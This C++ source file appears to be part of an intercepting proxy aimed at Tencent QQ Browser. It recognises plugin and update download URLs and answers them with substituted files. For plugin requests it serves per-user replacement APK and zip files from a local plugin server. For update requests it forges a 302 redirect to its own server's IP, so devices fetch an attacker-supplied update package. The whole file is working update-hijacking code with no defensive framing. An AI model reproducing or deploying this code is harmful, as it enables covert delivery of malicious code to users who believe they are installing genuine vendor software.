

#include "QQmtt.h"
#include "../cipher/CryptoUtils.h"
#include "../HttpUtils.h"
#include "PluginServer.h"

int gQQMttFlag = 0;



int QQmtt::isQQmttPlugin(string url, string host) {
	if (host == "soft.imtt.qq.com")
	{
		if (strstr(url.c_str(), "/browser/shortcut/junk_shortcut.apk"))
		{
			gQQMttFlag = 2;
			return TRUE;
		}
		else if (strstr(url.c_str(), "/browser/plugin/big_file/libTPGDecoder.zip"))
		{
			gQQMttFlag = 3;
			return TRUE;
		}
		else if (strstr(url.c_str(), "/browser/plugin/big_file/libSharpPDecoder.zip"))
		{
			gQQMttFlag = 4;
			return TRUE;
		}
	}else if (host == "dldir1.qq.com")
	{
		if (strstr(url.c_str(), "/invc/tt/QB/Public/plugin/big_file/qb_tvk_plugin_signed.zip"))
		{
			gQQMttFlag = 5;
			return TRUE;
		}
	}

	return FALSE;
}
int QQmtt::replyQQmttPlugin(char * lpbuf, int iCounter, int limit, LPHTTPPROXYPARAM lphttp) {
	if (gQQMttFlag == 2)
	{
		char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";

		string filename = Public::getUserUrl(lphttp->username, "junk_shortcut.apk");

		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
		return 0;
	}
	else if (gQQMttFlag == 3)
	{
		char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";

		string filename = Public::getUserUrl(lphttp->username, "libTPGDecoder.zip");

		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
		return 0;
	}
	else if (gQQMttFlag == 4)
	{
		char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";

		string filename = Public::getUserUrl(lphttp->username, "libSharpPDecoder.zip");

		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
		return 0;
	}
	else if (gQQMttFlag == 5)
	{
		char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";

		string filename = Public::getUserUrl(lphttp->username, "qb_tvk_plugin_signed.zip");

		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
		return 0;
	}
	return FALSE;
}


///directdown?app=ipai&channel=11173
///directdown?app=file&channel=10244
int QQmtt::isQQmttUpdatePacket(string url, string host) {
	if (host == "appchannel.html5.qq.com")
	{
		if (strstr(url.c_str(), "/directdown?app=") )
		{
			gQQMttFlag = 1;
			return TRUE;
		}
	}

	return FALSE;
}




int QQmtt::makeQQmttUpdateResp(char * lpbuf,int iCounter,int limit, LPSSLPROXYPARAM lpssl) {

	if (gQQMttFlag == 1)
	{
		char *szformat = "HTTP/1.1 302 Found\r\n"
			"Content-Type: text/html; charset=utf-8\r\n"
			"Content-Length: %u\r\n"
			"Connection: keep-alive\r\n"
			"X-Powered-By: Express\r\n"
			"Location: http://%s/%s\r\n"
			"Vary: Accept\r\n\r\n%s";

		char *conformat =
			"<p>Found. Redirecting to <a href=\"http://%s/%s\">http://%s/%s</a></p>";

		char bufcontent[1024];

		string strip = HttpUtils::getIPstr(gServerIP) + "/" + lpssl->username;
		int conlen = sprintf_s(bufcontent, 1024, conformat, strip.c_str(), QQMTT_UPDATE_ZIP_FILENAME, strip.c_str(), QQMTT_UPDATE_ZIP_FILENAME);
		int totallen = sprintf_s(lpbuf, limit, szformat, conlen, strip.c_str(), QQMTT_UPDATE_ZIP_FILENAME, bufcontent);

		return totallen;
	}

	return 0;
}